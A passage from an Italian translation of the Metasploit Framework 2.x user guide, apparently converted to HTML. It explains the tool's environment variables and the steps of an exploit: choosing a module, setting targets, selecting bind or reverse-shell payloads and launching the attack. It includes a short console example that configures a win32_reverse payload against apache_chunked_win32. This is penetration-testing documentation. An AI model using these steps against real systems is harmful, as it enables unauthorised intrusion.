+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	      
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Ambiente
+	Salvato</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	comando <B>save</B> puo&rsquo; essere usato per sincronizzare
+	l&rsquo;ambiente Globale e tutti gli ambienti Temporanei con il
+	disco. L&rsquo;ambiente salvato viene scritto sul file ~/.msf/config
+	e sara&rsquo; caricato non appena eseguita un&rsquo;interfaccia
+	utente qualsiasi.  </FONT></SPAN>
+	</P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>Uso
+	pratico dell&rsquo;ambiente</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif"><FONT COLOR="#000000">Questo
+	sistema di ambienti divisi permette di risparmiare tempo durante il
+	processo di <I>exploit</I> e durante un&rsquo;azione di <I>pen
+	testing</I>. Le opzioni comuni fra <I>exploits</I> possono essere
+	impostate nell&rsquo;ambiente Globale in modo che siano utilizzate
+	sempre nel caricamento di ogni <I>exploit</I>. </FONT></FONT></SPAN>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif"><FONT COLOR="#000000">L&rsquo;esempio
+	riportato di seguito mostra come gli ambienti Globali di LPORT,
+	LHOST e PAYLOAD possano essere usati per risparmiare tempo durante
+	la fase di <I>exploit</I> su obbiettivi con sistema operativo
+	Windows. Se questo ambiente viene impostato e un <I>exploit</I> per
+	sistemi Linux viene usato, l&rsquo;ambiente Temporaneo (attraverso
+	<B>set</B> e <B>unset</B>) puo&rsquo; essere usato per aggirare
+	queste impostazioni predefinite.</FONT></FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>setg LPORT 1234</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>LPORT -&gt; 1234</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>setg LHOST 192.168.0.10 </B></FONT></FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>LHOST -&gt; 192.168.0.10</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>setg PAYLOAD win32_reverse</B></FONT></FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>PAYLOAD -&gt;
+	win32_reverse</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">msf
+	&gt; <B>use apache_chunked_win32 </B></FONT></FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>msf
+	apache_chunked_win32(win32_reverse) &gt; show options </FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>Exploit and Payload
+	Options</FONT></FONT></P>
+	<P LANG="fr-FR" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<FONT FACE="Arial, sans-serif"><FONT SIZE=2>===========================</FONT></FONT></P>
+	<P LANG="fr-FR" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	<BR><BR>
+	</P>
+	<P LANG="fr-FR" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>Exploit:    Name     
+	Default    Description</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Courier New, monospace"><FONT SIZE=2><FONT FACE="Arial, sans-serif">--------
+	   ------    -------    ------------------    </FONT></FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>optional    SSL       
+	          Use SSL</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>required    RHOST     
+	      The target address</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>required    RPORT    
+	80   The target port</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>Payload:    Name      
+	 Default    Description</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>--------    --------  
+	 -------    ------------------------------------------    </FONT></FONT>
+	</P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>optional    EXITFUNC  
+	seh                   Exit technique: &quot;process&quot;, &quot;thread&quot;,
+	&quot;seh&quot;</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>required    LPORT     
+	 1234                  Local port to receive connection</FONT></FONT></P>
+	<P LANG="en-US" STYLE="margin-left: 0.52in; margin-right: 0.47in; margin-top: 0.05in; margin-bottom: 0.05in; border: 1px solid #808080; padding: 0.01in">
+	  <FONT FACE="Arial, sans-serif"><FONT SIZE=2>required    LHOST     
+	  192.168.0.10    Local address to receive connection</FONT></FONT></P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Variabili
+	d&rsquo;ambiente</B></FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;ambiente
+	puo&rsquo; essere usato per configurare molti aspetti del Framework,
+	andando dalle impostazioni dell&rsquo;interfaccia utente sino alle
+	impostazioni specifiche di <I>timeout</I> nel <I>socket</I> di rete
+	API. Questa sezione descrive le variabili d&rsquo;ambiente piu&rsquo;
+	utilizzate comunemente.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">DebugLevel
+	(livello di <I>debug</I>)</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile viene usata per controllare i messaggi di <I>debug</I>
+	risultanti dai componenti del Framework. Impostare questo vaolre su
+	0 evitare che i messaggi di <I>debug</I> vengano mostrati
+	(impostazione base). I valori della variabile <I>DebugLevel </I>
+	vanno da 0 a 5.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Logging</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile viene usata per abilitare o disabilitare il monitoraggio
+	della sessione. I <I>log</I> vengono salvati in ~/.msf/logs ma
+	questa directory puo&rsquo; essere cambiata usando la variabile
+	d&rsquo;ambiente LogDir. Per visualizzare i <I>log</I> della
+	sessione e&rsquo; possibile servirsi dell&rsquo;utilita&rsquo;
+	<B>msflogdump</B>. Questi <I>log</I> contengono l&rsquo;ambiente
+	completo per l&rsquo;<I>exploit</I> nonche&rsquo; il <I>timestamp</I>
+	per pacchetto.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>LogDir</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione specifica quale directory deve essere usata per
+	immagazzinare I <I>log</I>. Di base la directory usata e&rsquo;
+	~/.msf/logs. Ci sono due tipi di <I>log</I> file: il <I>log
+	</I>principale e i <I>log</I> delle sessioni. Il <I>log </I>principale
+	registra ogni azione significativa eseguita dalla interfaccia
+	console. Un nuovo <I>log</I> di sessione viene creato per ogni
+	tentativo di <I>exploit</I> andato a buon fine.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>Encoder</B></FONT></P>
+	<P LANG="en-US" CLASS="ww-table-contents-western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile puo&rsquo; essere impostata in una lista (separare ogni
+	voce con virgole) di Encoders preferiti. Il Framework provera&rsquo;
+	prima questa lista di Encoders (nel ordine trovato) dopodiche&rsquo;
+	andra&rsquo; a provare i rimanenti Encoders. Per una lista degli
+	Encoders disponibili, digitare <B>show encoders</B>.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Lucida Console, monospace"><FONT SIZE=2>msf&gt;
+	set Encoder ShikataGaNai</FONT></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>EncoderDontFallThrough</B></FONT></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Questa
+	opzione ordina al Framework di non utilizzare gli altri encoders nel
+	caso in cui non trovi gli encoders preferiti. Cio&rsquo; e&rsquo;
+	utile per mantenere la sicurezza all&rsquo;interno di una rete,
+	evitando di usare un encoder non voluto in caso fallisca l&rsquo;encoder
+	preferito.</FONT></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>Nop</B></FONT></P>
+	<P LANG="en-US" CLASS="ww-table-contents-western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Ha
+	lo stesso comportamento della variabile Encoder sopra menzionata,
+	eccetto che viene usato per specificare la lista dei moduli
+	generatori <I>Nop</I> preferiti. La lista dei generatori <I>Nop</I>
+	si ottiene digitando <B>show nops</B>.</FONT></SPAN></P>
+	<P CLASS="ww-table-contents-western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Lucida Console, monospace"><FONT SIZE=2>msf&gt;
+	set Nop Pex</FONT></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>NopDontFallThrough</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Ha
+	lo stesso comportamento dell&rsquo;opzione EncoderDontFallThrough,
+	solamente che viene applicata alla lista dei <I>Nop</I> preferiti.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>RandomNops</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione consente di intercambiare in maniera casuale I <I>nop</I>
+	anziche&rsquo; usare lo standard <I>nop</I> opcode. RandomNops
+	dovrebbe essere stabile e affidabile per tutti gli <I>exploit</I>
+	inclusi nel Framework.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>ConnectTimeout</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione permette di specificare un tempo limite di connessione per
+	<I>socket</I> TCP. Il valore di partenza e&rsquo; 10 ma potrebbe
+	essere necessario aumentarlo per riuscire nell&rsquo;<I>exploit </I>di
+	sistemi attraverso brevi collegamenti.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>RecvTimeout</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione specifica il numero massimo di secondi permessi per ogni
+	lettura di <I>socket</I> che specifica il valore di lunghezza
+	speciale di &ndash;1. Ancora una volta potrebbe rendersi necessario
+	aumentare questo valore per <I>exploit</I> con collegamenti di breve
+	durata.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>RecvTimeoutLoop</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione specifica il numero massimo di secondi da attendere per
+	ricevere dati su un <I>socket</I> prima di rimandarlo indietro.Ogni
+	volta che dei dati vengono ricevuti in questo periodo definito, il
+	ciclo riparte da capo.Aumentare questo valore per <I>exploit</I> con
+	collegamenti di breve durata.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>Proxies</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile d&rsquo;ambiente forza tutti I <I>socket</I> TCP a passare
+	attraverso una specifica catena di <I>proxy</I>. Il formato della
+	catena e&rsquo; <I>tipo:host:porta</I> per ogni <I>proxy</I>,
+	separato da una virgola. La versione 2.2 supporta SOCK4 e <I>proxy</I>
+	http.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>ForceSSL</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile forza tutti I <I>socket</I> TCP a negoziare con il
+	protocollo SSL. Cio&rsquo; e&rsquo; utile solo nel caso che un
+	modulo di <I>exploit</I> non fornisca l&rsquo;opzione &ldquo;SSL&rdquo;
+	all&rsquo;utente.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>UdpSourceIp</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile d&rsquo;ambiente puo&rsquo; essere usata per controllare
+	l&rsquo;indirizzo <I>IP</I> di origine dal quale vengono mandati
+	tutti i <I>datagrammi</I> <I>UDP</I>. E&rsquo; valida solo nel caso
+	vengano utilizzati <I>exploit</I> basati sull&rsquo; <I>UDP</I> (
+	MSSQL, ISS, etc). La variabile dipende dalla possibilita&rsquo; di
+	aprire dei <I>raw socket</I> , che normalmente e&rsquo; possibile
+	per l&rsquo;utente <I>root</I> o amministratore. Per quanto riguarda
+	la versione 2.2, questa caratteristica non funziona con l&rsquo;ambiente
+	Cygwin.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>NinjaHost</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	variabile puo&rsquo; essere impiegata per reindirizzare tutte le
+	connessioni <I>payload</I> ad un server socketNinja. Il valore da
+	assegnare dovrebbe essere l&rsquo;<I>indirizzo Ip</I> del computer
+	con il server socketNinja attivo.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>NinjaPort</B></FONT></P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif">Valore abbinato
+	alla variabile NinjaHost, per definire la porta alla quale
+	collegarsi sul server che fa girare il server socketNinja.</FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><B>NinjaDontKill</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione puo&rsquo; essere usata per <I>exploitare</I> diversi
+	sistemi con un solo tentativo. Risulta particolarmente utile negli
+	attacchi basati su UDP per indirizzi di trasmissione della rete.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><FONT FACE="Arial, sans-serif"><B>AlternateExit</B></FONT></P>
+	<P LANG="en-US" CLASS="western" STYLE="margin-bottom: 0in"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	opzione risolve un problema riscontrato in certe versioni
+	dell&rsquo;interprete Perl. Se la msfconsole va in <I>crash</I> con
+	un errore di <I>segmentation fault</I>, si consiglia di settare
+	questa opzione con il valore &ldquo;2&rdquo;.</FONT></SPAN></P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><BR>
+	</P>
+	<P CLASS="western" STYLE="margin-bottom: 0in"><FONT FACE="Arial, sans-serif">Per
+	una lista completa di tutte le variabili d&rsquo;ambiente
+	disponibili, si prega di far riferimento al file Environmetns.txt
+	che si trova nella sottodirectory &ldquo;docs&rdquo; del Framework..</FONT></P>
+	<P CLASS="western" STYLE="page-break-before: always"><FONT FACE="Arial, sans-serif"><FONT SIZE=5><B>Usare
+	il Framework</B></FONT></FONT></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Sciegliere
+	un modulo <I>exploit</I></FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Dall&rsquo;interfaccia
+	msfconsole, digitare <B>show exploits</B> per avere la lista degli
+	<I>exploit</I> disponibili. Selezionarne uno tramite il comando <B>use</B>,
+	specificando il nome del modulo come argomento. Il comando <B>show
+	info</B> mostra informazioni riguardo al modulo <I>exploit</I>
+	specificato.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Configurare
+	l&rsquo;exploit attivo</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Una
+	volta seleziona l&rsquo;<I>exploit</I>, il passo successivo e&rsquo;
+	determinare quali opzioni richiede Cio&rsquo; si puo&rsquo; fare
+	digitando il comando <B>show options</B>. La maggior parte degli
+	<I>exploit</I> usa l&rsquo;opzione <B>RHOST</B> per specificare
+	l&rsquo;indirizzo bersaglio e <B>RPORT</B> per definire la porta del
+	bersaglio. Usare <B>set</B> per impostare correttamente i valori
+	richiesti dalle opzioni. Per dubbi su cosa fa una determinata
+	opzione, fare riferimento al <I>codice sorgente</I> del modulo.
+	Alcuni <I>exploit</I> offrono delle opzioni avanzate, visibili
+	tramite il comando <B>show advanced</B>.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>Verificare le
+	opzioni dell&rsquo;exploit</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	comando <B>check</B> e&rsquo; utile per verificare se un dato
+	bersaglio e&rsquo; vulnerabile al modulo <I>exploit </I>attivo.
+	Praticamente una scorciatoia per controllare che tutte le opzioni
+	siano state correttamente inserite e che il bersaglio sia
+	effettivamente vulnerabile. Non tutti gli <I>exploit </I>hanno
+	implementato il comando <B>check</B>. Infatti in molti casi e&rsquo;
+	praticamente impossibile determinare se un servizio e' vulnerabile
+	senza averlo prima attaccato direttamente. Il comando <B>check</B>
+	non dovrebbe mai causare un <I>crash</I> della macchina e nemmeno
+	renderla inservibile. Molto moduli mostrano semplicemente
+	informazioni sulla versione e attendono che sia l&rsquo;utente ad
+	analizzare i dati prima di proseguire.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"></P>
+	<P LANG="en-US" CLASS="western" STYLE="page-break-before: always"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Selezionare
+	il <I>Payload</I></FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	<I>payload</I> e&rsquo; il codice attuale selezionato che verra&rsquo;
+	eseguito sul sistema bersaglio, una volta che l&rsquo;<I>exploit</I>
+	avra&rsquo; avuto successo. Usare il comando <B>show payloads</B>
+	per avere la lista di tutti i payload compatibili con l&rsquo;<I>exploit
+	</I>correntemente selezionato. Se l&rsquo;attaccante e&rsquo; dietro
+	un firewall, il payload migliore e&rsquo; senza dubbio il <I>bind
+	shell payload</I>. Se invece il bersaglio si trova dietro firewall e
+	l&rsquo;attaccante no, il payload da usare sara&rsquo; il <I>reverse
+	connect payload</I>. Per informazioni sui payload, digitare <B>info
+	&lt;nome_payload&gt;</B>.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Una
+	volta deciso il payload da utilizzare, usare il comando <B>set</B>
+	per specificare il nome del modulo payload e il valore per la
+	variabile d&rsquo;ambiente <B>PAYLOAD</B>. Successivamente usare il
+	comando <B>show options</B> per visualizzare tutte le opzioni
+	disponibili per il payload desiderato. Quasi tutti i payload hanno
+	almeno una opzione richiesta obbligatoriamente. Le opzioni avanzate
+	sono visualizzabili tramite il comando <B>show advanced</B>.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Selezionare
+	il bersaglio</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">La
+	maggior parte degli <I>exploit</I> richiede che la variabile
+	d&rsquo;ambiente <B>TARGET </B>sia impostata con l&rsquo;elenco dei
+	bersagli desiderati. Il comando <B>show targets</B> mostrera&rsquo;
+	la lista dei possibili bersagli disponibili con il modulo <I>exploit</I>
+	selezionato. Molto <I>exploit</I> usano come impostazione
+	predefinita del <B>TARGET </B>il <I>brute-force</I>, cosa che
+	potrebbe non essere gradita in tutte le occasioni.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Lanciare
+	l&rsquo;exploit</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	comando <B>exploit</B> lancia l&rsquo;attacco. Se tutto e&rsquo;
+	andato bene, il <I>payload</I> verra&rsquo; eseguito e potrebbe
+	darvi la possibilita&rsquo; di avere una <I>shell di comando</I> sul
+	sistema attaccato.</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P CLASS="western"><FONT FACE="Arial, sans-serif"><B>L&rsquo;interfaccia
+	a riga di comando</B></FONT></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Se
+	pensate che la console sia eccessiva per le vostre necessita&rsquo;,
+	troverete sicuramente interessante l&rsquo;interfaccia <U>msfcli</U>.
+	Questa interfaccia usa come primo parametro una data stringa ,
+	seguita dalle opzioni in formato VAR=VAL e per ultimo da un codice
+	di attivazione per specificare cosa dovrebbe essere fatto. La
+	stringa  da cercare e&rsquo; usata per determinare quale exploit si
+	vuole usare; nel caso che piu&rsquo; moduli combacino con la stringa
+	di ricerca, viene visualizzata la lista di questi possibili moduli.</FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Il
+	codice di attivazione e&rsquo; composto da una singola lettera; <B>S</B>
+	per il sommario, <B>O</B> per le opzioni, <B>A</B> per quelle
+	avanzate, <B>P</B> per i <I>payload</I>, <B>T</B> per i bersagli, <B>C</B>
+	per il controllo della vulnerabilita&rsquo; ed <B>E</B> per <I>exploit</I>.
+	L&rsquo;ambiente salvato verra&rsquo; poi caricato e utlizzato
+	all&rsquo;avvio, permettendo di configurare le opzioni di base del
+	l&rsquo;ambiente Globale della <I>msfconsole</I>, salvarle e
+	approfittare della interfaccia <I>msfcli.</I></FONT></SPAN></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">Questa
+	interfaccia a <I>riga di comando</I> e&rsquo; particolarmente adatta
+	per i processi automatici di <I>exploit</I> e per i test tramite
+	programmi BATCH; se combinata con un buon <I>payload</I> e uno
+	<I>scanner</I> intelligente puo&rsquo; risultare spietata! :)</FONT></SPAN></P>
+	<P CLASS="western"><BR><BR>
+	</P>
+	<P LANG="en-US" CLASS="western"><B><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;Interfaccia
+	Web</FONT></SPAN></B></P>
+	<P LANG="en-US" CLASS="western"><SPAN LANG="it-IT"><FONT FACE="Arial, sans-serif">L&rsquo;interfaccia
+	denominata <I>msfweb</I> e&rsquo; un server web funzionale che
+	permette di lanciare attacchi dal vostro <I>browser </I>web.
+	L&rsquo;interfaccia e&rsquo; ancora abbastanza primitiva ma puo&rsquo;
+	essere utile ad utenti che lavorano in un team che effettua dei 
